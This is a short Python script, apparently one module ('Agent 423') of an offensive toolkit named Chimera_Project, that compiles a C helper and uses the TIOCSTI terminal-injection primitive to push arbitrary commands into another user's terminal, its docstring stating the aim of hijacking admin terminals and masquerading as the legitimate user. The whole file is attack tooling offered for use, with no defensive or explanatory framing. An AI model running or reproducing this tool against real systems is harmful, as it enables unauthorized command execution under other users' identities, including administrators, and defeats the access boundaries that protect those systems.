#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess
import sys

class TTYHijacker:
    """
    Agent 423: TTY Injection Orchestrator.
    Identifies active admin terminals and utilizes the C-native 
    TIOCSTI primitive to masquerade as the legitimate user.
    """
    def execute(self, tty_path, command):
        print(f"--- [AGENT 423: TTY HIJACK SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/423_TTY_Hijacker/src/hijacker.c"
        bin_out = "/home/dan/Chimera_Project/agents/423_TTY_Hijacker/src/hijacker"
        
        # Compile
        subprocess.run(["gcc", src, "-o", bin_out], check=True)
        
        # Execute (Requires Root or being the owner of the TTY)
        if os.getuid() != 0:
             print("[!] Warning: Injecting into another user's TTY usually requires Root.")
        
        subprocess.run([bin_out, tty_path, command])

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./main.py <dev_path> <command>")
        sys.exit(1)
    
    TTYHijacker().execute(sys.argv[1], sys.argv[2])
